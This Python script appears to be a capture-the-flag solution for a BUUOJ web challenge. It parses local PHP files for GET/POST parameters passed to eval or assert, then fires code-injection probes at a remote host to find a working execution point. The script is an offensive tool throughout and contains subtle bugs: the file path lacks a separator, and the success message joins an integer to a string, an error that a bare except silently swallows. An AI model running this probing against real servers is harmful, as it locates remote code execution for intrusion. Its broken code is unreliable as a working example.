import requests
import os
import re

www = "http://dabea54b-e1ee-4dd5-91d8-223a0f6335d5.node4.buuoj.cn:81/"
file_path = "C:/Users/86135/Desktop/ctf tools/src"
phpfiles = os.listdir(file_path)
header = {'Content-Type': 'application/x-www-form-urlencoded'}
flag = ""
i = 0
regGetPost = "\w+\(.+\]"

for phpfile in phpfiles:
    print("\n", phpfile)
    phpFullPath = file_path + phpfile
    try:
        with open(phpFullPath, 'r') as txt:
            shell = txt.read()
            wordList = [word for word in re.findall(regGetPost, shell)]
            #print(wordList)
            for word in wordList:
                if "eval" in word:
                    payload = "echo 13579;"
                elif "assert" in word:
                    payload = 'var_dump("echo 13579")'
                else:
                    payload = "echo 13579"
                if "$_GET['" in word :
                    a = word.index("$_GET['")
                    word = word[a+7:-2]
                else:
                    a = word.index("$_POST['")
                    word = word[a+8:-2]
                url = www + phpfile + "?" + word + "=" + payload
                #print(url)
                data = word + "=" + payload
                html = requests.post(url, headers=header, data=data)
                i += 1
                print('*', end="")
                if "13579" in html.text:
                    print("\n" + phpfile + " is ok !" + word + " is ok，一共跑了" + i +"次")
                    flag = 13579
                    break
        if flag == 13579:
            break
    except Exception as e :
        pass